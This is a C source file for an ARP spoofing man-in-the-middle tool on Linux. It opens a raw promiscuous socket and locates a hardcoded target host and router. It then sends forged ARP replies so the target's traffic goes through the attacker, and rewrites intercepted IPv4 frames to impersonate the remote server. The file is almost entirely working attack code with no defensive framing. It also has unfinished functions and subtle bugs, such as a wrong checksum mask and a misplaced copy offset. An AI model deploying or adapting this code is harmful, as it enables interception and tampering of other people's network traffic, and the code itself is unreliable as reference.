#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

#define u8 unsigned char
#define u16 unsigned short

void arpsend(u8 operation,uint64_t hwsender,uint64_t hwreceiver,u8* psender,u8* preceiver,int s)
{
    char msg[14+28];
    //MAC/Ethernet
    memcpy(msg,(u8*)&hwreceiver,6);
    memcpy(&msg[6],(u8*)&hwsender,6);
    msg[12]=0x08;
    msg[13]=0x06;
    //ARP
    msg[14+0]=0x00;
    msg[14+1]=0x01;
    msg[14+2]=0x08;//IPv4
    msg[14+3]=0x00;//IPv4
    msg[14+4]=6;
    msg[14+5]=4;
    msg[14+6]=0x00;
    msg[14+7]=operation;
    memcpy(&msg[14+8],(u8*)&hwsender,6);
    memcpy(&msg[14+14],psender,4);
    memcpy(&msg[14+18],(u8*)&hwreceiver,6);
    memcpy(&msg[14+24],preceiver,4);
    send(s,msg,sizeof(msg),0);
}

void btoh(u8* from,u8* to,u16 len)
{
    int p = 0;
    for(u16 i=0;i<len-1;i++)
    {
        p+=sprintf(&to[p],"%02hhX:",from[i]);
    }
    sprintf(&to[p],"%02hhX",from[len-1]);
}

void btod(u8* from,u8* to,u16 len)
{
    int p = 0;
    for(u16 i=0;i<len-1;i++)
    {
        p+=sprintf(&to[p],"%hhu.",from[i]);
    }
    sprintf(&to[p],"%hhu",from[len-1]);
}

u8 pflags;

u16 ipv4_csum(u16* header)//Assumes length = 20
{
    uint32_t acc=0;
    for(u8 i=0;i<10;i++)
        acc+=header[i];
    u16 c;
    while (c=((acc&0xF0000)>>16))
    {
        acc&=0xFFFF;
        acc+=c;
    }
    return ~acc;
}

void manageipv4(u8* buf,u8*target,u8*target_ip,u8*myaddr,u8*myip,int s)
{

}

u16 ip4id = 0;
void sendUDP(u16 portfrom,u16 portto,u16 len,u8* ipfrom,u8* ipto,u8* data,int s)
{
    u16 tsize = len+28;
    u8* msg = malloc(tsize);
    //IPV4
    msg[0] = 0b01000101;
    msg[1] = 0;
    msg[2] = (tsize&0xff00)>>8;
    msg[3] = tsize&0xff;
    msg[4] = (ip4id&0xff)>>8;
    msg[5] = ip4id&0xff;
    ip4id++;
    msg[6] = 0x40;
    msg[7] = 0x00;
    msg[8] = 64;
    msg[9] = 0x11;//Protocol
    msg[10]= 0;
    msg[11]= 0;
    memcpy(&msg[12],ipfrom,4);
    memcpy(&msg[16],ipto,4);
    u16 sum = ipv4_csum((u16*)msg);
    msg[10]= (sum*0xff00)>>8;
    msg[11]= sum&0xff;
    //UDP
    tsize-=20;
    msg[20] = (portfrom&0xff00)>>8;
    msg[21] = portfrom&0xff;
    msg[22] = (portto&0xff00)>>8;
    msg[23] = portto&0xff;
    msg[24] = (tsize&0xff00)>>8;
    msg[25] = tsize&0xff;
    msg[26] = 0;msg[27] = 0;
    memcpy(&msg[27],data,len);
    send(s,msg,len+28,0);
    free(msg);
}

void sendTCP(u16 portfrom,u16 portto,u16 len,u8* ipfrom,u8* ipto,u8* data,int s)
{
    u16 tsize = len+40;
    u8* msg = malloc(tsize);
    //IPV4
    msg[0] = 0b01000101;
    msg[1] = 0;
    msg[2] = (tsize&0xff00)>>8;
    msg[3] = tsize&0xff;
    msg[4] = (ip4id&0xff)>>8;
    msg[5] = ip4id&0xff;
    ip4id++;
    msg[6] = 0x40;
    msg[7] = 0x00;
    msg[8] = 64;
    msg[9] = 0x06;//Protocol
    msg[10]= 0;
    msg[11]= 0;
    memcpy(&msg[12],ipfrom,4);
    memcpy(&msg[16],ipto,4);
    u16 sum = ipv4_csum((u16*)msg);
    msg[10]= (sum*0xff00)>>8;
    msg[11]= sum&0xff;
    //TCP

}
char true_mac[6];
char false_server[4];
void manage(u8* buf,u8*target,u8*target_ip,u8*myaddr,u8*myip,int s,int sbuf)
{
    u16 prot = *(u16*)&buf[12];
    char macn[26];
    char ipn[32];
    switch (prot)
    {
    case 0x0608:
        if(buf[14+7]==0x02 && !memcmp(target_ip,&buf[14+14],4))
        {
            pflags|=0b10;
            btoh(&buf[14+8],macn,6);
            printf("TARGET FOUND! It's %s\n",macn);
            memcpy(target,&buf[14+8],6);
        }
        else if(buf[14+7]==0x02 && !memcmp((u8[]){192,168,0,1},&buf[14+14],4))
        {
            pflags|=0b100;
            btoh(&buf[14+8],macn,6);
            printf("True router FOUND! It's %s\n",macn);
            memcpy(true_mac,&buf[14+8],6);
        }
        else if(pflags&1)//Debug ARP
        {
            btoh(&buf[14+8],macn,6);
            btod(&buf[20+8],ipn,4);
            //btoh(&buf[24+8],&macn[13],6);
            btod(&buf[30+8],&ipn[16],4);
            if(buf[14+7]==0x02)
                printf("ARP: =========> %s is %s. Tell %s (%s)\n",ipn,macn,&ipn[16],&macn[13]);
            else
                printf("ARP: Who has %s? Tell %s (%s)\n",&ipn[16],ipn,macn);
        }
        break;
    case 0x0008:
        //External request
        if(!memcmp(buf,myaddr,6) && !memcmp(&buf[6],target,6))
        {
            printf("extr\n");
            //We store the request's server
            memcpy(false_server,&buf[14+16],4);
            //And repeat the request to ourselves, from ourselves
            memcpy(&buf[14+12],target_ip,4);
            memcpy(&buf[14+16],myip,4);
            memcpy(buf,myaddr,6);
            memcpy(&buf[6],target,6);
            send(s,buf,sbuf,0);
        }
        //Request from us to other
        if(!memcmp(&buf[14+12],myip,4) && !memcmp(&buf[14+16],target_ip,4))
        {
            printf("usus\n");
            //We repeat the request, but to the client and "from the server"
            memcpy(&buf[14+12],false_server,4);
            memcpy(&buf[14+16],target_ip,4);
            memcpy(&buf[6],target,6);
            send(s,buf,sbuf,0);
        }
        break;
    default:
        break;
    }
}

int main(int argn,char *argv[])
{
    pflags=0;
    if(argn<2)
    {
        printf("Must specify a device\n");
        return -1;
    }
    if(argn>3)
        pflags|=1;

    char target[6];
    char target_ip[4]={192,168,0,35};

    errno=0;

    int err;
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(err = errno)
    {
        printf("Error on opening socket: %d: %s\n",err,strerror(err));
        return 1;
    }

    struct sockaddr_ll addr ={
        .sll_family=AF_PACKET,
        .sll_protocol=htons(ETH_P_ALL),
        .sll_pkttype=PACKET_OTHERHOST
    };

    //Get device info
    struct ifreq ireq;
    memcpy(ireq.ifr_name,argv[1],sizeof(argv[1]));
    
    errno=0;
    ioctl(s,SIOCGIFINDEX,&ireq);
    if(err = errno)
    {
        printf("Error on collecting index: %d: %s\n",err,strerror(err));
        goto CLOSE;
    }
    addr.sll_ifindex=ireq.ifr_ifindex;
    errno=0;
    ioctl(s,SIOCGIFHWADDR,&ireq);
    if(err = errno)
    {
        printf("Error on collecting hardware addr: %d: %s\n",err,strerror(err));
        goto CLOSE;
    }
    addr.sll_hatype=ireq.ifr_hwaddr.sa_family;
    addr.sll_halen=6;
    memcpy(addr.sll_addr,ireq.ifr_hwaddr.sa_data,6);

    printf("I am MAC ");
    for(unsigned char i=0;i<6;i++)
        printf("%hhX",addr.sll_addr[i]);
    printf("\n");

    //Bind
    errno=0;
    bind(s,(const struct sockaddr*)&addr,sizeof(addr));
    if(err = errno)
    {
        printf("Error on binding socket: %d: %s\n",err,strerror(err));
        goto CLOSE;
    }

    errno=0;
    fcntl(STDIN_FILENO,F_SETFL,fcntl(STDIN_FILENO,F_GETFL)|O_NONBLOCK);
    if(err = errno)
    {
        printf("Error on cont. STDIO set: %d: %s\n",err,strerror(err));
        goto CLOSE;
    }

    //Promiscuous
    struct packet_mreq preq={
        .mr_type = PACKET_MR_PROMISC
    };
    preq.mr_alen=addr.sll_halen;
    preq.mr_ifindex=addr.sll_ifindex;
    memcpy(preq.mr_address,addr.sll_addr,8);
    errno=0;
    setsockopt(s,SOL_PACKET,PACKET_ADD_MEMBERSHIP,&preq,sizeof(preq));
    if(err = errno)
    {
        printf("Error on promiscuous mode: %d: %s\n",err,strerror(err));
        goto CLOSE;
    }

    //Read frames until enter
    unsigned char buf[1542];
    u8 self[]={192,168,0,178};
    short len;
    char c;
    printf("Press enter to stop.\n");
    char nam[16];
    btod(self,nam,4);
    printf("I am %s. Broadcasting\n",nam);
    arpsend(1,*(uint64_t*)addr.sll_addr,0x00ffffffffffff,self,self,s);
    btod(target_ip,nam,4);
    uint32_t timer=0;
    printf("Probing for target's address...\nWho has %s, and who's the router we'll impersonate?\n",nam);
    while(1)
    {
        if((pflags&0b110)!=0b110)
        {
            if(timer==0)
            {
                if(pflags&0b100)
                    arpsend(1,*(uint64_t*)addr.sll_addr,0x00ffffffffffff,self,target_ip,s);
                else
                    arpsend(1,*(uint64_t*)addr.sll_addr,0x00ffffffffffff,self,(u8[]){192,168,0,1},s);
            }
        }
        if(timer==0 && pflags&0b10)
        {
            arpsend(2,*(uint64_t*)addr.sll_addr,*(uint64_t*)target,(u8[]){192,168,0,1},target_ip,s);
        }
        timer++;
        timer%=0b111111100000001;
        errno=0;
        len = recv(s,buf,sizeof(buf),MSG_TRUNC|MSG_DONTWAIT);
        if(len>0)
        {
            char* nam;
            manage(buf,target,target_ip,addr.sll_addr,self,s,len);
        }
        errno=0;
        fread_unlocked(&c,1,1,stdin);
        if(!errno)
            break;
    }
    fcntl(STDIN_FILENO,F_SETFL,fcntl(STDIN_FILENO,F_GETFL)&(O_NONBLOCK));
    CLOSE:
    close(s);
}